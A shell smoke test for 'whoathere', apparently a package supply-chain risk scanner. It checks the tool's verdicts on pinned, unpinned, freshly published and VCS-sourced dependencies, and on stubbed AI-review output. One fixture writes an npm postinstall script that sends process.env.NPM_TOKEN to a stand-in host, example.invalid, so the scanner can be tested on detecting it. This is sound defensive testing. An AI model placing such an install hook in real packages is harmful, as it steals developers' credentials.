#!/bin/sh
set -eu

ROOT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
CLI="$ROOT_DIR/whoathere/target/debug/whoathere"
WORK_DIR="${TMPDIR:-/tmp}/whoathere-package-risk-smoke.$$"
STATE_DIR="$WORK_DIR/state"

cleanup() {
  rm -rf "$WORK_DIR"
}
trap cleanup EXIT INT TERM

require_contains() {
  needle=$1
  file=$2
  label=$3
  if ! grep -Fq "$needle" "$file"; then
    echo "missing_${label}: $needle" >&2
    cat "$file" >&2
    exit 1
  fi
}

require_not_contains() {
  needle=$1
  file=$2
  label=$3
  if grep -Fq "$needle" "$file"; then
    echo "forbidden_${label}: $needle" >&2
    cat "$file" >&2
    exit 1
  fi
}

run_capture() {
  expected=$1
  output=$2
  shift 2
  set +e
  "$@" >"$output" 2>&1
  status=$?
  set -e
  if [ "$status" -ne "$expected" ]; then
    echo "unexpected_exit expected=$expected actual=$status command=$*" >&2
    cat "$output" >&2
    exit 1
  fi
}

latest_receipt() {
  find "$STATE_DIR/package-risk/receipts" -name '*.json' -type f | sort | tail -n 1
}

cargo build --manifest-path "$ROOT_DIR/whoathere/Cargo.toml" -p whoathere-cli --bin whoathere >/dev/null
mkdir -p "$WORK_DIR"

PINNED="$WORK_DIR/pinned"
mkdir -p "$PINNED"
cat >"$PINNED/requirements.txt" <<'REQ'
safe-pkg==1.2.3 # whoathere-published-at=1700000000
REQ
run_capture 0 "$WORK_DIR/pinned.json" "$CLI" package-risk assess --workspace "$PINNED" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains '"overall_verdict": "auto_sync_candidate"' "$WORK_DIR/pinned.json" pinned_auto_candidate
require_contains '"all_freshness_allowed": true' "$WORK_DIR/pinned.json" pinned_freshness
PINNED_RECEIPT=$(latest_receipt)
run_capture 0 "$WORK_DIR/approve.json" "$CLI" package-risk approve --receipt "$PINNED_RECEIPT" --reason "package risk smoke baseline" --state-dir "$STATE_DIR" --json
require_contains '"approved_count": 1' "$WORK_DIR/approve.json" approve_count

UNPINNED="$WORK_DIR/unpinned"
mkdir -p "$UNPINNED"
cat >"$UNPINNED/requirements.txt" <<'REQ'
safe-pkg>=1.0
REQ
run_capture 0 "$WORK_DIR/unpinned.json" "$CLI" package-risk assess --workspace "$UNPINNED" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'last_known_good_substitution_selected' "$WORK_DIR/unpinned.json" lkg_reason
require_contains '"selected_version": "1.2.3"' "$WORK_DIR/unpinned.json" lkg_version

NO_LKG="$WORK_DIR/no-lkg"
mkdir -p "$NO_LKG"
cat >"$NO_LKG/requirements.txt" <<'REQ'
unknown-pkg>=1.0
REQ
run_capture 22 "$WORK_DIR/no-lkg.json" "$CLI" package-risk assess --workspace "$NO_LKG" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'unpinned_no_last_known_good' "$WORK_DIR/no-lkg.json" no_lkg_reason

FRESH="$WORK_DIR/fresh"
mkdir -p "$FRESH"
NOW=$(date +%s)
cat >"$FRESH/requirements.txt" <<REQ
fresh-pkg==2.0.0 # whoathere-published-at=$NOW
REQ
run_capture 22 "$WORK_DIR/fresh.json" "$CLI" package-risk assess --workspace "$FRESH" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'fresh_release_cooldown_active' "$WORK_DIR/fresh.json" fresh_gate

DIRECT="$WORK_DIR/direct"
mkdir -p "$DIRECT"
cat >"$DIRECT/requirements.txt" <<'REQ'
evil @ git+https://example.invalid/evil.git
REQ
run_capture 20 "$WORK_DIR/direct.json" "$CLI" package-risk assess --workspace "$DIRECT" --ecosystem pypi --state-dir "$STATE_DIR" --json
require_contains 'direct_vcs_editable_denied_by_default' "$WORK_DIR/direct.json" direct_deny

NPM_EVIL="$WORK_DIR/npm-evil"
mkdir -p "$NPM_EVIL"
cat >"$NPM_EVIL/package.json" <<'JSON'
{"name":"compromised-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"scripts":{"postinstall":"node postinstall.js"},"repository":"https://example.invalid/repo"}
JSON
cat >"$NPM_EVIL/postinstall.js" <<'JS'
fetch("https://example.invalid/collect?token=" + process.env.NPM_TOKEN)
JS
run_capture 22 "$WORK_DIR/npm-evil.json" "$CLI" package-risk assess --workspace "$NPM_EVIL" --ecosystem npm --state-dir "$STATE_DIR" --json
require_contains 'npm_lifecycle_script_postinstall' "$WORK_DIR/npm-evil.json" npm_postinstall
require_contains 'credential_or_environment_access' "$WORK_DIR/npm-evil.json" npm_secret
require_contains 'network_capability_observed' "$WORK_DIR/npm-evil.json" npm_network

AI_SAFE="$WORK_DIR/ai-safe"
mkdir -p "$AI_SAFE"
cat >"$AI_SAFE/package.json" <<'JSON'
{"name":"ai-safe-looking","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"repository":"https://example.invalid/repo"}
JSON
FAKE_OLLAMA_FINDINGS="$WORK_DIR/fake-ollama-findings"
cat >"$FAKE_OLLAMA_FINDINGS" <<'SH'
#!/bin/sh
cat >/dev/null
printf '{"risk":"suspicious","reason_codes":["credential_exfil"],"summary":"WHOATHERE_CANARY_TOKEN_VALUE"}\n'
exit 0
SH
chmod +x "$FAKE_OLLAMA_FINDINGS"
run_capture 22 "$WORK_DIR/ai-findings.json" env WHOATHERE_OLLAMA_BIN="$FAKE_OLLAMA_FINDINGS" "$CLI" package-risk assess --workspace "$AI_SAFE" --ecosystem npm --state-dir "$STATE_DIR" --ai-review --ai-model fake-review-model --ai-timeout-seconds 5 --json
require_contains '"artifact_review_status": "findings"' "$WORK_DIR/ai-findings.json" ai_findings_status
require_contains 'artifact_review_model_credential_exfil' "$WORK_DIR/ai-findings.json" ai_findings_reason
require_not_contains 'WHOATHERE_CANARY_TOKEN_VALUE' "$WORK_DIR/ai-findings.json" ai_raw_output

FAKE_OLLAMA_CLEAN="$WORK_DIR/fake-ollama-clean"
cat >"$FAKE_OLLAMA_CLEAN" <<'SH'
#!/bin/sh
cat >/dev/null
printf '{"risk":"clean","reason_codes":["no_issue_seen"],"summary":"clean"}\n'
exit 0
SH
chmod +x "$FAKE_OLLAMA_CLEAN"
run_capture 22 "$WORK_DIR/ai-clean-fresh.json" env WHOATHERE_OLLAMA_BIN="$FAKE_OLLAMA_CLEAN" "$CLI" package-risk assess --workspace "$FRESH" --ecosystem pypi --state-dir "$STATE_DIR" --ai-review --ai-model fake-review-model --ai-timeout-seconds 5 --json
require_contains '"artifact_review_status": "passed"' "$WORK_DIR/ai-clean-fresh.json" ai_clean_status
require_contains 'artifact_review_clean_advisory' "$WORK_DIR/ai-clean-fresh.json" ai_clean_reason
require_contains 'fresh_release_cooldown_active' "$WORK_DIR/ai-clean-fresh.json" ai_clean_no_fresh_bypass

RELEASE_RECEIPT=$PINNED_RECEIPT
run_capture 0 "$WORK_DIR/release-plan.json" "$CLI" vm release-plan --class pypi.pure_wheel.v1 --vm-ready --static-clean --dynamic-clean --egress-clean --no-canary-access --scanner-clean --package-risk-receipt "$RELEASE_RECEIPT" --json
require_contains '"package_risk_receipt_applied": true' "$WORK_DIR/release-plan.json" release_receipt
require_contains '"verdict": "auto_sync"' "$WORK_DIR/release-plan.json" release_auto

for file in "$WORK_DIR"/*.json; do
  require_not_contains 'WHOATHERE_CANARY_TOKEN_VALUE' "$file" raw_canary
  require_not_contains 'npm_secret_token_value' "$file" raw_token
  require_not_contains '/Users/' "$file" host_path
done

echo "package_risk_smoke=ok"
